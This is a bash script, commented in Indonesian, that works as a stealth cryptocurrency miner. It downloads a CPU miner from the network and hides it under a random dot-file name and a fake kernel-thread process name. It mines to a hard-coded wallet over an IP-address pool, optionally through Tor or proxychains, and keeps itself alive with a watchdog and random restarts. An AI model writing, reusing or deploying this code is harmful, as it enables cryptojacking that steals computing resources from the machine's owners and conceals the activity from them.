#!/bin/bash
set -e

# ===[ Konfigurasi Dasar ]===
BASE_WALLET="Bc4QbZ9pPM5sJQ1RLdG7SrJCjqCnT5FVq9"
WORKER="$(tr -dc a-z0-9 </dev/urandom | head -c 6)"
WALLET="$BASE_WALLET.$WORKER"
POOL="stratum+tcps://159.223.48.143:443"
ALGO="power2b"
THREADS=$(( $(nproc) / 2 ))
LOG_FILE=".xlog"
RND_BIN=".sys_$(tr -dc a-z0-9 </dev/urandom | head -c 5)"
PROCNAME="[bioset/$(shuf -i 0-3 -n1)]"

PROXY_CONF="proxychains.conf"
USE_PROXY=false
if command -v torsocks >/dev/null 2>&1; then
    USE_PROXY=true
elif command -v proxychains4 >/dev/null 2>&1; then
    USE_PROXY=true
fi

if [ ! -f "$RND_BIN" ]; then
    echo "[INFO] Mengunduh miner..."
    curl -L -o miner.tgz https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar -xf miner.tgz
    mv cpuminer-sse2 "$RND_BIN"
    chmod +x "$RND_BIN"
    rm -f miner.tgz
fi

run_miner() {
    while true; do
        cp "$RND_BIN" "/tmp/$RND_BIN.$$"
        chmod +x "/tmp/$RND_BIN.$$"
        rm -f "$RND_BIN"
        CMD="/tmp/$RND_BIN.$$ -a $ALGO -o $POOL -u $WALLET -p x -t $THREADS"
        if command -v torsocks >/dev/null 2>&1; then
            exec -a "$PROCNAME" torsocks $CMD >> "$LOG_FILE" 2>&1
        elif command -v proxychains4 >/dev/null 2>&1; then
            exec -a "$PROCNAME" proxychains4 -f "$PROXY_CONF" $CMD >> "$LOG_FILE" 2>&1
        else
            exec -a "$PROCNAME" $CMD >> "$LOG_FILE" 2>&1
        fi
        echo "[WARN] Miner keluar. Restart..." >> "$LOG_FILE"
        sleep 5
    done
}

watchdog() {
    while true; do
        sleep 30
        PID=$(pgrep -fa "$PROCNAME" | grep -v grep | awk '{print $1}')
        if [ -z "$PID" ]; then
            echo "[WATCHDOG] Miner mati. Restart..." >> "$LOG_FILE"
            nohup bash "$0" > /dev/null 2>&1 &
            exit 0
        fi
    done
}

rotate_restart() {
    while true; do
        sleep $((RANDOM % 900 + 2700))
        echo "[ROTATE] Restart acak miner..." >> "$LOG_FILE"
        pkill -f "$PROCNAME"
    done
}

(run_miner &) &
(watchdog &) &
(rotate_restart &) &
disown -a
echo "[INFO] Stealth Miner Anti-Dismiss Aktif (24 Jam Nonstop) dengan Worker: $WORKER"
